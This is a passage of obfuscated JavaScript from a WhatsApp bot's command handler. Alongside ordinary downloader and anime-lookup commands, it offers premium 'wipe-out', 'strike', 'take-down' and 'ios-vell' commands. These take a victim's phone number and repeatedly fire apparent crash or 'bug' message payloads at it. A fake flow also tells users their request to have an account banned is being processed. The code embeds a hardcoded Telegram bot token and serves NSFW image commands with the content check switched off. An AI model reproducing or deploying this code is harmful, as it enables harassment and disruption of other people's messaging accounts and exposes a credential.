                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x463b99(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬.."
              });
            } catch (_0x189b16) {
              console.error("Error occurred:", _0x189b16);
            }
          })();
          break;
        }
      case "reportt":
        {
          if (!_0x40d288) {
            return _0x32539a("Please send the piece of information you would like to report to us like so:\n       .report hi sir marx the menu isn't showing on iOS");
          }
          const _0x36fa15 = _0x40d288.trim();
          const _0x25da13 = "officialmarxbotinc@gmail.com";
          const _0x2b3845 = "Issues";
          const _0x2594f1 = "Report Message: " + _0x36fa15;
          const _0x292164 = "mailto:" + _0x25da13 + "?subject=" + encodeURIComponent(_0x2b3845) + "&body=" + encodeURIComponent(_0x2594f1);
          const _0x240d49 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "REPORT MESSAGE",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x292164,
            mediaUrl: _0x292164
          };
          const _0x508e14 = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x240d49
          };
          const _0xfbb5d = {
            text: "Your report has been formatted. Please click the button below to send your report.",
            contextInfo: _0x508e14,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0xfbb5d);
          break;
        }
      case "checktrial":
        const _0x309acf = "./database/lib/lowdb/adapters/jane.json";
        if (_0x4d1a4f.existsSync(_0x309acf)) {
          try {
            const _0x16cbce = _0x4d1a4f.readFileSync(_0x309acf, "utf8");
            if (!_0x16cbce) {
              _0x3b9923("Trial file is empty or corrupted. Please restart the trial.");
              return;
            }
            const _0x494022 = JSON.parse(_0x16cbce);
            const _0x5c5848 = _0x494022.startTime;
            const _0x5bff58 = Date.now() - _0x5c5848;
            const _0x579e86 = 18000000;
            if (_0x5bff58 > _0x579e86) {
              _0x3b9923("Trial has expired. Restarting the bot...");
              process.exit(1);
            } else {
              const _0x2d4725 = _0x579e86 - _0x5bff58;
              const _0xca4168 = Math.floor(_0x2d4725 / 3600000);
              const _0xedf9df = Math.floor(_0x2d4725 % 3600000 / 60000);
              _0x3b9923("\n𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nTrial remaining time: " + _0xca4168 + "hrs|" + _0xedf9df + " minutes.\nUpgrade to Main to gain full access 🗿");
            }
          } catch (_0x47aea9) {
            _0x3b9923("Error reading or parsing the trial file.");
            console.log("Error:", _0x47aea9.message);
          }
        } else {
          _0x3b9923("No trial found. Starting a new trial.");
          startTrial();
        }
        break;
      case "report":
        {
          if (!_0x40d288) {
            return _0x3b9923("Please send the piece of information you would like to report to us like so:\n       .report hi sir marx the menu isn't showing on iOS");
          }
          const _0x2e9753 = _0x40d288.trim();
          const _0x218a9f = "officialmarxbotinc@gmail.com";
          const _0x56ef6b = "Issues";
          const _0x1d9856 = "Report Message: " + _0x2e9753;
          const _0x14d55b = "mailto:" + _0x218a9f + "?subject=" + encodeURIComponent(_0x56ef6b) + "&body=" + encodeURIComponent(_0x1d9856);
          const _0x5c7bc4 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "REPORT MESSAGE",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x14d55b,
            mediaUrl: _0x14d55b
          };
          const _0x4c3c7d = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x5c7bc4
          };
          const _0x418a03 = {
            text: "Click this message to send your report.",
            contextInfo: _0x4c3c7d,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x418a03);
          setTimeout(() => {
            _0x3b9923("Thank you, " + _0x45dcac + "! Your report has been successfully submitted. We’ll review it and get back to you soon.");
          }, 15000);
          break;
        }
      case "wipe-out":
      case "slabdsbby":
      case "strike":
      case "take-down":
      case "take-out":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x3a126f = q.replace(/[^0-9]/g, "");
          if (_0x3a126f.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0x7e479b = 0; _0x7e479b < 5; _0x7e479b++) {
            await _0x64eff0(target);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x72fe09(target, _0x8d23b4);
            await _0x4fbc32(target, _0x28a3bf);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "telestik":
      case "stiktele":
      case "telesticker":
        {
          async function _0x207e93(_0x171015) {
            return new Promise(async (_0x4eb69f, _0x41bbe2) => {
              const _0x13032a = _0x171015.replace("https://t.me/addstickers/", "");
              const _0x4e59c2 = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=" + encodeURIComponent(_0x13032a), {
                method: "GET",
                headers: {
                  "User-Agent": "GoogleBot"
                }
              });
              const _0x22359a = [];
              for (let _0x1ff1a1 = 0; _0x1ff1a1 < _0x4e59c2.data.result.stickers.length; _0x1ff1a1++) {
                const _0x3a67e0 = _0x4e59c2.data.result.stickers[_0x1ff1a1].thumb.file_id;
                const _0x3d62eb = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=" + _0x3a67e0);
                const _0x29f097 = {
                  url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + _0x3d62eb.data.result.file_path
                };
                _0x22359a.push(_0x29f097.url);
              }
              _0x4eb69f(_0x22359a);
            });
          }
          if (!_0x40d288) {
            return _0x3b9923("Masukan Imput Url\n\nExample: " + (_0x3a5987 + _0x4ae68c) + " https://t.me/addstickers/video_5609982615_by_prinzeugen_robot");
          }
          let _0x1ce3f1 = await _0x207e93(_0x40d288);
          if (_0x1ce3f1.length > 0) {
            _0x3b9923(mess.wait);
            _0x1ce3f1.forEach(_0x1d8466 => {
              _0x4b53e5.sendFile(_0x21f0d9.chat, _0x1d8466, "wms.webp", "", _0x21f0d9, false, {
                asSticker: true
              });
            });
          } else {
            _0x3b9923("No result.");
          }
        }
        break;
      case "spotify":
        if (!_0x40d288) {
          return _0x3b9923("Where is the url?\n*Example:* " + (_0x3a5987 + _0x4ae68c) + " https://open.spotify.com/track/xxxxxx");
        }
        _0x4b53e5.sendMessage(_0x21f0d9.chat, {
          react: {
            text: "👒",
            key: _0x21f0d9.key
          }
        });
        let _0x35ddef = linkRegex.test(_0x40d288);
        if (!_0x35ddef) {
          return _0x3b9923("Only Support Track URL *(music)*\n*Example URL:* https://open.spotify.com/track/xxxxxx");
        }
        let _0x297ebc = await spotifyDown(_0x40d288);
        let {
          nama: _0x48cb8c,
          title: _0x187370,
          durasi: _0x28ccc9,
          thumb: _0x1688fc,
          url: _0x541346
        } = _0x297ebc;
        if (_0x297ebc) {
          let _0x5c9561 = "*© 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 𝖬𝗎𝗌𝗂𝖼*\n\n*[🏷️] Info Music*\n* *Title:* " + _0x187370 + "\n* *Duration:* " + _0x28ccc9 + "\n* *Artist:* " + _0x48cb8c + "\n* *Spotify:* " + _0x40d288 + "\n\n`You Can Search Spotify Music`\n*The method:* " + _0x3a5987 + "spotisearch <music name>";
          const _0x1506dd = {
            mediaUrl: "",
            mediaType: 1,
            title: _0x187370,
            body: "© t.me/civstyle",
            thumbnailUrl: _0x1688fc,
            sourceUrl: "",
            renderLargerThumbnail: true,
            showAdAttribution: false
          };
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            text: _0x5c9561,
            contextInfo: {
              mentionedJid: [_0x21f0d9.sender],
              externalAdReply: _0x1506dd
            }
          }, {
            quoted: _0x21f0d9
          });
          const _0x4a7839 = {
            url: _0x541346
          };
          const _0x16fd59 = {
            audio: _0x4a7839,
            mimetype: "audio/mp4"
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x16fd59, {
            quoted: _0x21f0d9
          });
        } else {
          _0x3b9923(eror);
        }
        break;
      case "tiktok":
        {
          async function _0x5679b5(_0x46b317) {
            return new Promise(async (_0x164708, _0x1ab98a) => {
              try {
                const _0x1adb65 = new URLSearchParams();
                _0x1adb65.set("url", _0x46b317);
                _0x1adb65.set("hd", "1");
                const _0x239e0d = await axios({
                  method: "POST",
                  url: "https://tikwm.com/api/",
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    Cookie: "current_language=en",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
                  },
                  data: _0x1adb65
                });
                const _0x422da4 = _0x239e0d.data.data;
                const _0x105f34 = {
                  title: _0x422da4.title,
                  cover: _0x422da4.cover,
                  origin_cover: _0x422da4.origin_cover,
                  no_watermark: _0x422da4.play,
                  watermark: _0x422da4.wmplay,
                  music: _0x422da4.music
                };
                const _0x25d99b = _0x105f34;
                _0x164708(_0x25d99b);
              } catch (_0x333b7d) {
                _0x1ab98a(_0x333b7d);
              }
            });
          }
          if (_0x13e106.length == 0) {
            return _0x3b9923("☘️ *Where's the TikTok link??*");
          }
          if (!_0x5079ce(_0x13e106[0])) {
            return _0x3b9923("⚠️ *Thats Not The Right Link*");
          }
          _0x3b9923(mess.wait);
          let _0x1fddb0 = "";
          let _0x388b6e = await _0x5679b5("" + _0x13e106[0]);
          const _0x113d54 = {
            url: _0x388b6e.no_watermark
          };
          const _0x4dfce1 = {
            video: _0x113d54,
            caption: _0x1fddb0,
            fileName: "tiktok.mp4",
            mimetype: "video/mp4"
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x4dfce1).then(() => {
            const _0xa57bf2 = {
              url: _0x388b6e.music
            };
            const _0x725f5f = {
              audio: _0xa57bf2,
              fileName: "tiktok.mp3",
              mimetype: "audio/mp4"
            };
            _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x725f5f);
          });
        }
        break;
      case "playvvvvg2":
        if (!_0x40d288) {
          return _0x3b9923("what song are you looking for?");
        }
        try {
          let _0x1bd3da = await (await fetch("https://endpoint.web.id/search/spotify?key=" + global.key + "&query=" + _0x40d288)).json();
          if (_0x1bd3da.status && _0x1bd3da.result.length > 0) {
            let _0x2a5663 = Math.floor(Math.random() * _0x1bd3da.result.length);
            let _0x4216b1 = _0x1bd3da.result[_0x2a5663];
            let _0xca69a1 = await (await fetch("https://endpoint.web.id/downloader/spotify?key=" + global.key + "&url=" + _0x4216b1.link)).json();
            let _0x98ca64 = _0xca69a1.result;
            const _0x49fd0b = {
              url: _0x98ca64.download
            };
            const _0x3eb12e = {
              title: _0x98ca64.title,
              body: "Author : " + _0x98ca64.artis,
              thumbnailUrl: _0x98ca64.image,
              mediaType: 1,
              showAdAttribution: false,
              renderLargerThumbnail: true
            };
            const _0x172160 = {
              externalAdReply: _0x3eb12e
            };
            const _0x70eb77 = {
              audio: _0x49fd0b,
              mimetype: "audio/mp4",
              contextInfo: _0x172160
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x70eb77, {
              quoted: _0x21f0d9
            });
          } else {
            _0x3b9923("No results found.");
          }
        } catch (_0x254aea) {
          _0x3b9923("shannz rest api is having error");
        }
        break;
      case "genshin":
      case "swimsuit":
      case "schoolswimsuit":
      case "white":
      case "barefoot":
      case "touhou":
      case "gamecg":
      case "hololive":
      case "uncensored":
      case "sunglasses":
      case "glasses":
      case "weapon":
      case "shirtlift":
      case "chain":
      case "fingering":
      case "flatchest":
      case "torncloth":
      case "bondage":
      case "demon":
      case "pantypull":
      case "headdress":
      case "headphone":
      case "anusview":
      case "shorts":
      case "stockings":
      case "topless":
      case "beach":
      case "bunnygirl":
      case "bunnyear":
      case "vampire":
      case "nobra":
      case "bikini":
      case "whitehair":
      case "blonde":
      case "pinkhair":
      case "bed":
      case "ponytail":
      case "nude":
      case "dress":
      case "underwear":
      case "foxgirl":
      case "uniform":
      case "skirt":
      case "breast":
      case "twintail":
      case "spreadpussy":
      case "seethrough":
      case "breasthold":
      case "fateseries":
      case "spreadlegs":
      case "openshirt":
      case "headband":
      case "nipples":
      case "erectnipples":
      case "greenhair":
      case "wolfgirl":
      case "catgirl":
        {
          let _0x532b32 = true;
          if (!_0x532b32) {
            return _0x3b9923(mess.nsfw);
          }
          try {
            let _0x456af9 = await fetch("https://fantox-apis.vercel.app/" + _0x4ae68c);
            if (!_0x456af9.ok) {
              throw await _0x456af9.text();
            }
            let _0x4bc8a0 = await _0x456af9.json();
            if (!_0x4bc8a0.url) {
              throw "Error";
            }
            const _0x99e9ab = {
              url: _0x4bc8a0.url
            };
            const _0x35b0b9 = {
              image: _0x99e9ab,
              caption: "Here you go!"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x35b0b9, {
              quoted: _0x21f0d9
            });
          } catch (_0x384017) {
            _0x3b9923("Failed to fetch NSFW content.");
          }
          break;
        }
      case "enc":
        {
          if (!_0x40d288) {
            return _0x3b9923("Provide the JavaScript code to obfuscate.");
          }
          const _0x156177 = require("javascript-obfuscator");
          try {
            let _0xa1a13a = _0x156177.obfuscate(_0x40d288, {
              compact: true,
              controlFlowFlattening: true
            }).getObfuscatedCode();
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
              text: "Here is your obfuscated code:\n" + _0xa1a13a
            }, {
              quoted: _0x21f0d9
            });
          } catch (_0x230781) {
            _0x3b9923("Error while obfuscating the code.");
          }
          break;
        }
      case "anilist":
        {
          const _0x259d44 = require("cheerio");
          if (!_0x40d288) {
            return _0x3b9923("*☘️ Example :* .anilist naruto");
          }
          function _0x4e424b(_0x51f05c) {
            return new Promise((_0x3befdb, _0x36c288) => {
              axios.get("https://anilist.co/search/anime?search=" + _0x51f05c).then(_0x4e2d25 => {
                const _0x3d24d3 = _0x259d44.load(_0x4e2d25.data);
                const _0x3da850 = [];
                const _0x2eb3a7 = [];
                const _0x9e327c = [];
                _0x3d24d3("div.media-card a").each(function (_0xec6669, _0x529bbb) {
                  _0x2eb3a7.push("https://anilist.co" + _0x3d24d3(_0x529bbb).attr("href"));
                });
                _0x3d24d3("div.media-card a img").each(function (_0x1e5577, _0x4a1863) {
                  _0x9e327c.push(_0x3d24d3(_0x4a1863).attr("src"));
                });
                for (let _0x305492 = 0; _0x305492 < 10; _0x305492++) {
                  const _0x3f799c = _0x2eb3a7[_0x305492];
                  const _0x1961bf = _0x9e327c[_0x305492];
                  const _0x51fa02 = {
                    link: _0x3f799c,
                    gambar: _0x1961bf
                  };
                  _0x3da850.push(_0x51fa02);
                }
                _0x3befdb(_0x3da850);
              }).catch(_0x4a5bed => {
                _0x36c288(_0x4a5bed);
              });
            });
          }
          async function _0x907ff5(_0x43971c) {
            try {
              const {
                data: _0x4796ad
              } = await axios.get(_0x43971c);
              const _0x13865b = _0x259d44.load(_0x4796ad);
              const _0x271b0f = _0x13865b("meta[property=\"og:title\"]").attr("content");
              const _0xebcdc5 = _0x13865b("meta[property=\"og:description\"]").attr("content");
              const _0x27182a = {
                title: _0x271b0f,
                description: _0xebcdc5
              };
              const _0x3716a3 = _0x27182a;
              return _0x3716a3;
            } catch (_0x590bc0) {
              console.error(_0x590bc0);
            }
          }
          const _0x4218b0 = await _0x4e424b(_0x40d288);
          const _0x13e83e = await _0x907ff5(_0x4218b0[0].link);
          const _0x124dc7 = {
            url: "" + _0x4218b0[0].gambar
          };
          const _0x242ffb = {
            image: _0x124dc7,
            caption: "Hasil Pencarian Anime:\n\nJudul: " + _0x13e83e.title + "\nDeskripsi: " + _0x13e83e.description + "\nLink: " + _0x4218b0[0].link
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x242ffb, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "itchio-search":
        {
          const _0x517a08 = require("cheerio");
          if (!q) {
            return _0x3b9923("*☘️ Example :* " + (_0x3a5987 + _0x4ae68c) + " Minecraft");
          }
          async function _0x44a525(_0x7e465d) {
            return new Promise((_0x56bd98, _0x44f880) => {
              axios.get("https://itch.io/search?q=" + _0x7e465d).then(_0x4283c9 => {
                const _0x257754 = _0x517a08.load(_0x4283c9.data);
                const _0x46a167 = [];
                const _0x15d2f4 = [];
                const _0x5c0545 = [];
                const _0x348729 = [];
                _0x257754("div.game_title > a").each(function (_0x3b38bb, _0x3579a7) {
                  _0x15d2f4.push(_0x257754(_0x3579a7).attr("href"));
                  _0x348729.push(_0x257754(_0x3579a7).text().trim());
                });
                _0x257754("div.game_author > a").each(function (_0x5339c7, _0x415f13) {
                  _0x5c0545.push(_0x257754(_0x415f13).attr("href"));
                });
                const _0x43a21b = _0x257754("div.game_genre");
                const _0x3b0b12 = _0x257754("span.web_flag");
                const _0x5cbf1e = _0x257754("div.game_text");
                const _0x28b797 = _0x257754("span.screenreader_only");
                for (let _0x19f5ca = 0; _0x19f5ca < 10; _0x19f5ca++) {
                  const _0x513326 = _0x348729[_0x19f5ca];
                  const _0x59f8b7 = _0x15d2f4[_0x19f5ca];
                  const _0x3319a2 = _0x5c0545[_0x19f5ca];
                  const _0x2caaac = _0x257754(_0x43a21b[_0x19f5ca]).text().trim();
                  const _0x15897b = _0x257754(_0x3b0b12[_0x19f5ca]).text().trim();
                  const _0x1bbeaf = _0x257754(_0x5cbf1e[_0x19f5ca]).text().trim();
                  const _0x5b6f14 = _0x257754(_0x28b797[_0x19f5ca]).text().trim();
                  const _0x2ec5c7 = {
                    Title: _0x513326,
                    Genre: _0x2caaac,
                    Platform: _0x15897b,
                    Deskripsi: _0x1bbeaf,
                    Rating: _0x5b6f14,
                    Author: _0x3319a2,
                    Link: _0x59f8b7
                  };
                  _0x46a167.push(_0x2ec5c7);
                }
                _0x56bd98(_0x46a167);
              }).catch(_0x34240b => {
                _0x44f880(_0x34240b);
              });
            });
          }
          const _0x1efb80 = "" + encodeURIComponent(_0x40d288);
          _0x44a525(_0x1efb80).then(_0x2ce3f2 => {
            if (_0x2ce3f2.length > 0) {
              const _0x58ee18 = _0x2ce3f2.map(_0x211fe3 => "\nTitle: " + _0x211fe3.Title + "\nAuthor: " + _0x211fe3.Author + "\nGenre: " + _0x211fe3.Genre + "\nPlatform: " + _0x211fe3.Platform + "\nDescription: " + _0x211fe3.Deskripsi + "\nRating: " + _0x211fe3.Rating + "\nLink: " + _0x211fe3.Link + "\n        ").join("\n\n");
              _0x3b9923("Found games:\n" + _0x58ee18);
            } else {
              _0x3b9923("No games found.");
            }
          }).catch(_0x504239 => {
            console.error("Error:", _0x504239);
            _0x3b9923("An error occurred while fetching data.");
          });
        }
        break;
      case "gtguide":
        {
          const _0x24e1d7 = require("cheerio");
          if (!q) {
            return _0x3b9923("*☘️ Example :* gtguide kai");
          }
          async function _0x340080(_0x277493) {
            try {
              const {
                data: _0x553517
              } = await axios.get("https://guardiantalesguides.com/game/guardians/show/" + _0x277493.toLowerCase());
              const _0x125acf = _0x24e1d7.load(_0x553517);
              let _0x26dd32 = "";
              const _0x247718 = _0x125acf(".stats div:contains(\"Name:\")").text().replace("Name:", "").trim();
              const _0x2eca3d = _0x125acf(".stats div:contains(\"School:\") em").text().trim();
              const _0x3aa51f = _0x125acf(".stats div:contains(\"Group Buff:\")").text().replace("Group Buff:", "").trim();
              const _0x443025 = _0x125acf(".stats div:contains(\"Introduced:\")").text().replace("Introduced:", "").trim();
              const _0x53aca9 = _0x125acf(".portrait.unique img").attr("src");
              const _0x578043 = "https://guardiantalesguides.com" + _0x53aca9;
              _0x26dd32 += "*Info Character:*\n";
              _0x26dd32 += "- Name: " + _0x247718 + "\n";
              _0x26dd32 += "- School: " + _0x2eca3d + "\n";
              _0x26dd32 += "- Group Buff: " + _0x3aa51f + "\n";
              _0x26dd32 += "- Introduced: " + _0x443025 + "\n\n";
              _0x26dd32 += "*Skill*\n";
              const _0x224d6c = _0x125acf("div.info:contains(\"Normal Atk\") .heading").text().trim();
              const _0x36010e = _0x125acf("div.info:contains(\"Normal Atk\") .text h5").text().trim() + " " + _0x125acf("div.info:contains(\"Normal Atk\") .text").text().replace(_0x125acf("div.info:contains(\"Normal Atk\") .text h5").text(), "").trim();
              _0x26dd32 += _0x224d6c + "\n> " + _0x36010e + "\n\n";
              const _0x2f5b39 = _0x125acf("div.info:contains(\"Chain Skill\") .heading").text().trim();
              const _0x21e1e7 = _0x125acf("div.info:contains(\"Chain Skill\") .text h5").text().trim() + " " + _0x125acf("div.info:contains(\"Chain Skill\") .text").text().replace(_0x125acf("div.info:contains(\"Chain Skill\") .text h5").text(), "").trim();
              _0x26dd32 += _0x2f5b39 + " - " + _0x125acf("div.info:contains(\"Chain Skill\") .heading em").text().trim() + "\n> " + _0x21e1e7 + "\n\n";
              const _0x3f7a2d = _0x125acf("div.info:contains(\"Special Ability\") .heading").text().trim();
              const _0x3354ca = _0x125acf("div.info:contains(\"Special Ability\") .text h5").text().trim() + " " + _0x125acf("div.info:contains(\"Special Ability\") .text").text().replace(_0x125acf("div.info:contains(\"Special Ability\") .text h5").text(), "").trim();
              _0x26dd32 += _0x3f7a2d + "\n> " + _0x3354ca + "\n\n";
              const _0x22978b = _0x125acf("div.info:contains(\"Ex Weapon\") .heading").text().trim();
              const _0x2e9957 = _0x125acf("div.info:contains(\"Ex Weapon\") .text h5").text().trim() + " " + _0x125acf("div.info:contains(\"Ex Weapon\") .text").text().replace(_0x125acf("div.info:contains(\"Ex Weapon\") .text h5").text(), "").trim();
              _0x26dd32 += _0x22978b + "\n> " + _0x2e9957 + "\n\n";
              _0x26dd32 += "*Latest Meta Rankings:*\n";
              _0x125acf(".metaGuardianRankings > div").each((_0x34713a, _0x56a45b) => {
                const _0x4d13b9 = _0x125acf(_0x56a45b).find("h2").text().trim();
                const _0x403477 = _0x125acf(_0x56a45b).find(".ranks").text().trim();
                const _0x189b5b = _0x125acf(_0x56a45b).find("strong").first().text().trim();
                const _0x10238f = _0x125acf(_0x56a45b).find("div").eq(1).text().trim();
                _0x26dd32 += _0x4d13b9 + " - Rank #" + _0x403477 + "\n> " + _0x189b5b + "% of Top 100\n" + (_0x10238f ? "> " + _0x10238f : "") + "\n\n";
              });
              const _0x1bf43b = {
                url: _0x578043
              };
              const _0x67edbe = {
                image: _0x1bf43b,
                caption: _0x26dd32
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x67edbe);
            } catch (_0x70eac1) {
              console.error(_0x70eac1);
              _0x3b9923("Terjadi Rusak.");
            }
          }
          _0x340080("" + encodeURIComponent(q));
        }
        break;
      case "animeinfo":
        {
          if (!_0x40d288) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " Jujutsu Kaisen");
          }
          try {
            let _0x5dea30 = await fetch("https://api.jikan.moe/v4/anime?q=" + encodeURIComponent(_0x40d288));
            if (!_0x5dea30.ok) {
              throw new Error("Network response was not ok");
            }
            let _0x58ee98 = await _0x5dea30.json();
            if (!_0x58ee98 || !_0x58ee98.data || _0x58ee98.data.length === 0) {
              throw new Error("No results found");
            }
            let _0x115aad = _0x58ee98.data[0];
            let _0x5c2044 = "🔖 *Title*: " + _0x115aad.title + "\n📖 *Description:* " + _0x115aad.synopsis + "\n🎐 *Season:* N/A\n📌 *Status:* " + _0x115aad.status + "\n📚 *Episode:* " + _0x115aad.episodes + "\n🎋 *Rate:* " + _0x115aad.score + "\n📏 *Duration:* " + _0x115aad.duration + "\n📆 *Release Date:* " + _0x115aad.aired.prop.from;
            const _0x40d4e7 = {
              url: _0x115aad.images.jpg.large_image_url
            };
            const _0x3e5f74 = {
              image: _0x40d4e7,
              caption: _0x5c2044
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x3e5f74, {
              quoted: _0x21f0d9
            });
            _0x3b9923("Animee details fetched successfully!");
          } catch (_0x376281) {
            console.error("Error fetching anime details:", _0x376281);
            _0x3b9923("Sorry, there was an error fetching the anime details.");
          }
          break;
        }
      case "kitsune":
        {
          try {
            let _0x51b3fa = await fetch("https://nekos.best/api/v2/kitsune");
            let _0x16b0eb = await _0x51b3fa.json();
            let _0x5f21d4 = _0x16b0eb.results[0];
            const _0x1b9d37 = {
              url: _0x5f21d4.url
            };
            const _0x58f3b1 = {
              image: _0x1b9d37,
              caption: "Success"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x58f3b1, {
              quoted: _0x21f0d9
            });
            _0x3b9923("Successfully fetched and sent the kitsune image.");
          } catch (_0x5e2d39) {
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, "Error fetching kitsune image.", {
              quoted: _0x21f0d9
            });
            _0x3b9923("Failed to fetch the kitsune image.");
          }
          break;
        }
      case "ios-vell":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x28b2e7 = q.replace(/[^0-9]/g, "");
          if (_0x28b2e7.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0xbe4829 = 0; _0xbe4829 < 5; _0xbe4829++) {
            await _0x16cddd;
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "join":
        {
          if (!_0x590e27) {
            return;
          }
          if (!_0x40d288) {
            return _0x3b9923("Enter Group Link!");
          }
          if (!_0x5079ce(_0x13e106[0]) && !_0x13e106[0].includes("whatsapp.com")) {
            return "Link Invalid!";
          }
          _0x3b9923(mess.wait);
          let _0x273155 = _0x13e106[0].split("https://chat.whatsapp.com/")[1];
          await _0x4b53e5.groupAcceptInvite(_0x273155).then(_0x24e99a => _0x3b9923(jsonformat(_0x24e99a))).catch(_0x5b4be0 => _0x3b9923(jsonformat(_0x5b4be0)));
        }
        break;
      case "block":
        {
          if (!_0x590e27) {
            return;
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x11db8f = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          _0x11db8f = _0x11db8f || _0x21f0d9.chat;
          if (_0x11db8f.includes("@g.us")) {
            return _0x3b9923("Loh, @g.us ? 🧐");
          }
          await _0x4b53e5.updateBlockStatus(_0x11db8f, "block").then(_0x375c4a => _0x3b9923(jsonformat(_0x375c4a))).catch(_0x285d6e => _0x3b9923(jsonformat(_0x285d6e)));
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "unblock":
        if (!_0x590e27) {
          return;
        }
